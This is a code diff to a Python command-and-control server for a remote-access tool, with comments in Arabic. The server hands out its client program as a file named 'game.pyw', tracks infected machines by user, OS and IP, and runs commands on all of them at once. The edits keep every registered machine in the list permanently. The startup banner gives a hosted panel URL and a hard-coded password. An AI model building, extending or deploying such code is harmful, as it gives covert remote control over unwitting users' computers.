@@ -1262,11 +1262,11 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                         const list = document.getElementById('sessionsList');
                         
                         if (sessions.length === 0) {
-                            list.innerHTML = '<div style="text-align:center;color:#666;padding:20px;">No clients connected</div>';
+                            list.innerHTML = '<div style="text-align:center;color:#666;padding:20px;">No clients registered yet</div>';
                             return;
                         }
                         
-                        // ⚡ الكود المعدل مع معالجة الأخطاء
+                        // ⚡ الكود المعدل - جميع العملاء يظهرون للأبد
                         list.innerHTML = sessions.map(client => {
                             try {
                                 const lastSeen = new Date(client.last_seen).getTime();
@@ -1288,14 +1288,26 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                                 
                                 const timeDiff = (now - lastSeen) / 1000;
                                 
-                                // 🟢 تصنيف موحد: 30 ثانية للنشاط
-                                const isOnline = timeDiff < 30;
+                                // ⚡ التعديل: ONLINE إذا كان أقل من 5 دقائق، OFFLINE إذا أكثر (لكن يبقى في القائمة)
+                                const isOnline = timeDiff < 300; // 5 دقائق = 300 ثانية
                                 
                                 const statusClass = isOnline ? 'online-status' : 'online-status offline';
                                 const statusText = isOnline ? 'ONLINE' : 'OFFLINE';
                                 const statusColor = isOnline ? '#28a745' : '#dc3545';
                                 
                                 const isSelected = client.id === currentClientId;
+                                
+                                // ⚡ عرض الوقت بشكل مناسب
+                                let timeDisplay = '';
+                                if (timeDiff < 60) {
+                                    timeDisplay = `${timeDiff.toFixed(0)}s ago`;
+                                } else if (timeDiff < 3600) {
+                                    timeDisplay = `${Math.floor(timeDiff / 60)}m ago`;
+                                } else if (timeDiff < 86400) {
+                                    timeDisplay = `${Math.floor(timeDiff / 3600)}h ago`;
+                                } else {
+                                    timeDisplay = `${Math.floor(timeDiff / 86400)}d ago`;
+                                }
                                 
                                 return `
                                     <div class="session-item ${isSelected ? 'active' : ''} ${!isOnline ? 'offline' : ''}" 
@@ -1305,8 +1317,8 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                                         <small>User: ${client.user || 'Unknown'}</small><br>
                                         <small>OS: ${client.os || 'Unknown'}</small><br>
                                         <small>IP: ${client.ip}</small><br>
-                                        <small>Last: ${timeDiff.toFixed(0)}s ago</small>
-                                        <small style="color: ${statusColor}; font-weight: bold;"> ${statusText}</small>
+                                        <small>Last: ${timeDisplay}</small>
+                                        <small style="color: ${statusColor}; font-weight: bold;"> • ${statusText}</small>
                                     </div>
                                 `;
                             } catch (error) {
@@ -1327,12 +1339,12 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 function updateSessionStats(sessions) {
                     const total = sessions.length;
                     
-                    // ✅ التصحيح: استخدام 30 ثانية موحدة للنشاط
+                    // ⚡ التعديل: ONLINE إذا كان أقل من 5 دقائق (300 ثانية)
                     const active = sessions.filter(client => {
                         try {
                             const lastSeen = new Date(client.last_seen).getTime();
                             const now = Date.now();
-                            return (now - lastSeen) < 30000; // 30 ثانية
+                            return (now - lastSeen) < 300000; // 5 دقائق = 300,000 ملي ثانية
                         } catch {
                             return false;
                         }
@@ -1385,27 +1397,27 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 
                 function executeAll(command) {
                     if (allClients.length === 0) {
-                        alert('No clients connected!');
+                        alert('No clients registered!');
                         return;
                     }
                     
-                    // ✅ التصحيح: استخدام 30 ثانية موحدة
+                    // ⚡ التعديل: ONLINE إذا كان أقل من 5 دقائق
                     const activeClients = allClients.filter(client => {
                         try {
                             const lastSeen = new Date(client.last_seen).getTime();
                             const now = Date.now();
-                            return (now - lastSeen) < 30000; // 30 ثانية
+                            return (now - lastSeen) < 300000; // 5 دقائق = 300,000 ملي ثانية
                         } catch {
                             return false;
                         }
                     });
                     
                     if (activeClients.length === 0) {
-                        alert('No active clients!');
+                        alert('No currently online clients! But you can still select offline clients manually.');
                         return;
                     }
                     
-                    addToTerminal(`Executing command on ${activeClients.length} clients: ${command}\n`);
+                    addToTerminal(`Executing command on ${activeClients.length} online clients: ${command}\n`);
                     
                     activeClients.forEach(client => {
                         executeSingleCommand(client.id, command);
@@ -1506,7 +1518,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
         self.send_header('Content-Disposition', 'attachment; filename="game.pyw"')
         self.end_headers()
         self.wfile.write(client_code.encode())
-
+    
     def handle_client_register(self, data):
         with self.session_lock:
             client_id = data.get('client_id', str(uuid.uuid4())[:8])
@@ -1515,7 +1527,6 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
             incoming_computer = data.get('computer', 'Unknown')
             incoming_os = data.get('os', 'Unknown')
             
-            # ⚡ التعديل: استخدام متغير واحد للوقت
             current_time = datetime.now().isoformat()
     
             if incoming_user == 'Unknown' and '-' in client_id:
@@ -1526,7 +1537,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                         incoming_computer = parts[0]
                 except:
                     pass
-                
+                    
             existing_client = None
             for cid, client_data in self.sessions.items():
                 current_user = client_data.get('user', '')
@@ -1538,12 +1549,11 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     incoming_computer != 'Unknown'):
                     existing_client = cid
                     break
-                
+                    
             if existing_client is None and client_id in self.sessions:
                 existing_client = client_id
     
             if existing_client:
-                # ⚡ التعديل: استخدام المتغير الموحد
                 self.sessions[existing_client]['last_seen'] = current_time
                 self.sessions[existing_client]['status'] = 'online'
                 self.sessions[existing_client]['ip'] = client_ip
@@ -1551,10 +1561,9 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 if incoming_os != 'Unknown':
                     self.sessions[existing_client]['os'] = incoming_os
     
-                print(f" INSTANT Updated: {incoming_computer} ({incoming_user}) - {client_ip}")
+                print(f"🟢 HEARTBEAT Updated: {incoming_computer} ({incoming_user}) - {client_ip}")
                 self.send_json({'success': True, 'client_id': existing_client, 'instant': True})
             else:
-                # ⚡ التعديل: استخدام المتغير الموحد
                 self.sessions[client_id] = {
                     'id': client_id,
                     'ip': client_ip,
@@ -1562,13 +1571,13 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     'computer': incoming_computer,
                     'os': incoming_os,
                     'user': incoming_user,
-                    'first_seen': current_time,  # ⚡ نفس التنسيق
-                    'last_seen': current_time,   # ⚡ نفس التنسيق
+                    'first_seen': current_time,
+                    'last_seen': current_time,
                     'pending_command': None,
                     'last_response': None,
                     'status': 'online'
                 }
-                print(f" INSTANT New: {incoming_computer} ({incoming_user}) - {client_ip}")
+                print(f"🟢 NEW CLIENT Registered: {incoming_computer} ({incoming_user}) - {client_ip}")
                 self.send_json({'success': True, 'client_id': client_id, 'instant': True})
                 
     def send_sessions_list(self):
@@ -1578,36 +1587,29 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
         
             for client_id, client_data in list(self.sessions.items()):
                 try:
-                    # ⚡ التعديل: معالجة الأخطاء في تحويل الوقت
                     last_seen_str = client_data['last_seen']
-                    if isinstance(last_seen_str, str):
-                        last_seen = datetime.fromisoformat(last_seen_str)
-                    else:
-                        # إذا لم يكن نصاً، استخدم الوقت الحالي
-                        last_seen = current_time
-                        client_data['last_seen'] = current_time.isoformat()
-                    
+                    last_seen = datetime.fromisoformat(last_seen_str)
                     time_diff = (current_time - last_seen).total_seconds()
                 
-                    if time_diff < 300:  # 5 minutes for cleanup
-                        # ⚡ التعديل: استخدام 30 ثانية موحدة للنشاط
-                        client_data['is_online'] = time_diff < 30  # 30 seconds for online
-                        client_data['last_seen_seconds'] = time_diff
-                        active_clients.append(client_data)
-                    else:
-                        del self.sessions[client_id]
-                        print(f"INSTANT Removed inactive: {client_id}")
+                    # ⚡ التعديل: لا نحذف أي عميل أبداً
+                    # ⚡ يعتبر ONLINE إذا كان ضمن 5 دقائق، OFFLINE إذا أكثر
+                    is_online = time_diff < 300  # 5 دقائق
+                    
+                    client_data['is_online'] = is_online
+                    client_data['last_seen_seconds'] = time_diff
+                    active_clients.append(client_data)
+                        
+                    status = "🟢 ONLINE" if is_online else "🔴 OFFLINE (But Registered)"
+                    print(f"📊 Client {client_id}: {status} ({time_diff:.1f}s ago)")
                         
                 except Exception as e:
-                    # ⚡ التعديل: معالجة الأخطاء وإصلاح البيانات التالفة
-                    print(f"INSTANT Time error for {client_id}: {e}")
-                    # إصلاح البيانات
+                    print(f"❌ Time error: {e}")
                     client_data['last_seen'] = current_time.isoformat()
                     client_data['is_online'] = True
-                    client_data['last_seen_seconds'] = 0
                     active_clients.append(client_data)
         
-            self.send_json(active_clients)   
+            print(f"👥 Total registered clients: {len(active_clients)}")
+            self.send_json(active_clients)
     def handle_get_commands(self):
         with self.session_lock:
             # ⚡ التعديل: استخدام متغير الوقت الموحد
@@ -1740,28 +1742,30 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
         self.end_headers()
         self.wfile.write(json.dumps(data).encode())
 
-def instant_cleanup_sessions():
-    """INSTANT session cleanup"""
+def permanent_sessions_manager():
+    """مدير الجلسات الدائمة - لا يحذف أي عميل"""
     while True:
         try:
             current_time = datetime.now()
             with EnhancedRemoteControlHandler.session_lock:
-                for client_id, client_data in list(EnhancedRemoteControlHandler.sessions.items()):
-                    last_seen = datetime.fromisoformat(client_data['last_seen'])
-                    if (current_time - last_seen).total_seconds() > 300:
-                        del EnhancedRemoteControlHandler.sessions[client_id]
-            time.sleep(30)  # ⚡ Clean every 30 seconds
+                # ⚡ فقط نطبع الإحصائيات بدون حذف
+                total_clients = len(EnhancedRemoteControlHandler.sessions)
+                online_clients = len([c for c in EnhancedRemoteControlHandler.sessions.values() 
+                                    if (current_time - datetime.fromisoformat(c['last_seen'])).total_seconds() < 300])
+                
+                print(f"📊 PERMANENT SESSIONS: {online_clients}/{total_clients} clients (Online/Total)")
+            time.sleep(60)  # تحديث كل دقيقة
         except:
             pass
-
 def main():
     handler = EnhancedRemoteControlHandler
     handler.init_database(handler)
     
-    threading.Thread(target=instant_cleanup_sessions, daemon=True).start()
+    # ⚡ استبدل دالة التنظيف بمدير الجلسات الدائمة
+    threading.Thread(target=permanent_sessions_manager, daemon=True).start()
     
     print("=" * 80)
-    print(" ENHANCED REMOTE CONTROL SERVER - ULTRA INSTANT MODE")
+    print(" ENHANCED REMOTE CONTROL SERVER - PERMANENT SESSIONS MODE")
     print("=" * 80)
     print("Control Panel:     https://game-python-1.onrender.com")
     print("Python Client:     https://game-python-1.onrender.com/download-python-client")
@@ -1770,15 +1774,14 @@ def main():
     print("Level 2 Password: sudohacker")
     print("Database:         remote_control.db")
     print("=" * 80)
-    print(" INSTANT MODE ACTIVATED - 0ms RESPONSE TIME")
-    print(" All commands execute immediately without delay")
-    print(" Ultra-fast communication and execution")
+    print(" PERMANENT SESSIONS ACTIVATED - CLIENTS NEVER GET DELETED")
+    print(" Once registered, clients remain in list forever")
+    print(" Online status: Last 5 minutes = ONLINE, Older = OFFLINE")
     print("=" * 80)
     
     try:
         server = ThreadedHTTPServer(('0.0.0.0', 8080), EnhancedRemoteControlHandler)
-        print(" Server started INSTANTLY on port 8080! Press Ctrl+C to stop.")
-        print(" Features: Instant Execution, 0ms Delay, Real-time Responses")
+        print(" Server started with PERMANENT SESSIONS on port 8080! Press Ctrl+C to stop.")
         server.serve_forever()
     except KeyboardInterrupt:
         print("Server stopped by user")
